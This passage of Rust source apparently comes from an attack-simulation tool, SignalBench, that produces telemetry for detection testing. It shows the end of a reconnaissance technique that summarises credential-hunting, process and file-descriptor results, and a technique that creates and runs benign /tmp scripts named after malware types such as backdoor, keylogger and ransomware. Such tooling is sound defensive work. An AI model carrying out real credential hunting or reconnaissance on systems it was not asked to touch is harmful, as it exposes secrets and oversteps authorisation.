                .arg(&script_file)
                .output()
                .await
                .map_err(|e| format!("Failed to execute reconnaissance script: {e}"))?;
            
            // Parse output for summary
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            
            // Extract key metrics from output
            let mut summary_parts: Vec<String> = vec![];
            
            if let Some(listener_line) = stdout.lines().find(|l| l.contains("Socket listener completed")) {
                summary_parts.push(listener_line.split(']').next_back().unwrap_or("Persistent socket listener").trim().to_string());
            }
            if let Some(fd_line) = stdout.lines().find(|l| l.contains("Total open file descriptors")) {
                summary_parts.push(fd_line.split(']').next_back().unwrap_or("FD enumeration").trim().to_string());
            }
            if let Some(cred_line) = stdout.lines().find(|l| l.contains("Credential-related env vars")) {
                summary_parts.push(cred_line.split(']').next_back().unwrap_or("Credential hunting").trim().to_string());
            }
            if let Some(proc_line) = stdout.lines().find(|l| l.contains("processes enumerated")) {
                summary_parts.push(proc_line.split(']').next_back().unwrap_or("Process scan").trim().to_string());
            }
            if stdout.contains("Comprehensive report written") {
                summary_parts.push(format!("Report: {recon_report}"));
            }
            
            let success_msg = if summary_parts.is_empty() {
                format!("Executed enhanced Python reconnaissance (session: {session_id})")
            } else {
                format!("Python reconnaissance complete (session: {session_id}): {}", summary_parts.join(", "))
            };
            
            info!("{success_msg}");
            info!("Console log: {log_file}");
            info!("Comprehensive report: {recon_report}");
            
            if !stderr.is_empty() {
                warn!("Python script errors: {stderr}");
            }
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: output.status.success(),
                message: success_msg,
                artifacts: vec![script_file, log_file, recon_report],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}
pub struct UncommonRemoteShellCommands {}

#[async_trait]
impl AttackTechnique for UncommonRemoteShellCommands {
    fn info(&self) -> Technique {
        Technique {
            id: "T1059.004.001".to_string(),
            name: "Uncommon Remote Shell Commands".to_string(),
            description: "Generates telemetry for uncommon command execution patterns with suspicious command names".to_string(),
            category: "execution".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "command_count".to_string(),
                    description: "Number of uncommon commands to execute".to_string(),
                    required: false,
                    default: Some("5".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "File to save command execution log to".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_uncommon_cmds".to_string()),
                },
            ],
            detection: "Monitor for execution of uncommon binaries with suspicious names indicating potential remote access tools".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        use rand::seq::SliceRandom;
        
        let command_count: usize = config
            .parameters
            .get("command_count")
            .unwrap_or(&"5".to_string())
            .parse()
            .unwrap_or(5);
            
        let log_file = config
            .parameters
            .get("log_file")
            .unwrap_or(&"/tmp/signalbench_uncommon_cmds".to_string())
            .clone();

        // Scary-sounding command suffixes for simulation
        let scary_suffixes = vec![
            "backdoor", "rootkit", "keylogger", "cryptominer", "ransomware",
            "botnet", "exploit", "shellcode", "payload", "dropper",
            "stealer", "trojan", "beacon", "implant", "injector",
            "dumper", "exfiltrate", "scanner", "harvester", "persistence",
        ];

        // Generate random selections BEFORE async block
        let mut rng = rand::thread_rng();
        let mut command_list = Vec::new();
        for _ in 0..command_count {
            let suffix = scary_suffixes.choose(&mut rng).unwrap_or(&"backdoor");
            let cmd_name = format!("signalbench_{suffix}");
            let cmd_path = format!("/tmp/{cmd_name}");
            command_list.push((cmd_name, cmd_path));
        }

        Box::pin(async move {
            let mut artifacts = vec![log_file.clone()];

            if dry_run {
                let cmd_names: Vec<String> = command_list.iter()
                    .map(|(name, _)| name.clone())
                    .collect();
                info!("[DRY RUN] Would execute uncommon commands: {}", cmd_names.join(", "));
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would execute {command_count} uncommon commands"),
                    artifacts: vec![log_file],
                    cleanup_required: false,
                });
            }

            // Create the log file
            let mut log = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
            
            writeln!(log, "=== SignalBench Uncommon Remote Shell Commands ===")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Time: {}", chrono::Local::now().to_rfc3339())
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Command count: {command_count}")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log)
                .map_err(|e| format!("Failed to write to log file: {e}"))?;

            // Create and execute each uncommon command
            for (cmd_name, cmd_path) in &command_list {
                writeln!(log, "=== Executing: {cmd_name} ===")
                    .map_err(|e| format!("Failed to write to log file: {e}"))?;

                // Create a simple shell script with the scary name
                let script_content = format!(
                    "#!/bin/sh\necho 'SignalBench telemetry generator - {} executed'\necho 'Timestamp: {}'\necho 'User: {}'\n",
                    cmd_name,
                    chrono::Local::now().to_rfc3339(),
                    whoami::username()
                );

                let mut script_file = File::create(cmd_path)
                    .map_err(|e| format!("Failed to create command script: {e}"))?;
                
                script_file.write_all(script_content.as_bytes())
                    .map_err(|e| format!("Failed to write command script: {e}"))?;

                // Make it executable
                let _ = Command::new("chmod")
                    .args(["+x", cmd_path])
                    .status()
                    .await;

                // Execute the uncommon command
                info!("Executing uncommon command: {cmd_name}");
                let output = Command::new(cmd_path)
                    .output()
                    .await;

                match output {
                    Ok(output) => {
                        writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
                        writeln!(log, "Output:")
                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
                        log.write_all(&output.stdout)
                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
                        if !output.stderr.is_empty() {
                            writeln!(log, "Stderr:")
                                .map_err(|e| format!("Failed to write to log file: {e}"))?;
                            log.write_all(&output.stderr)
                                .map_err(|e| format!("Failed to write to log file: {e}"))?;
                        }
                    },
                    Err(e) => {
                        writeln!(log, "Error executing command: {e}")
                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
                    }
                }

                writeln!(log)
                    .map_err(|e| format!("Failed to write to log file: {e}"))?;

                artifacts.push(cmd_path.clone());
            }

            info!("Executed {command_count} uncommon remote shell commands");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Successfully executed {command_count} uncommon remote shell commands"),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}
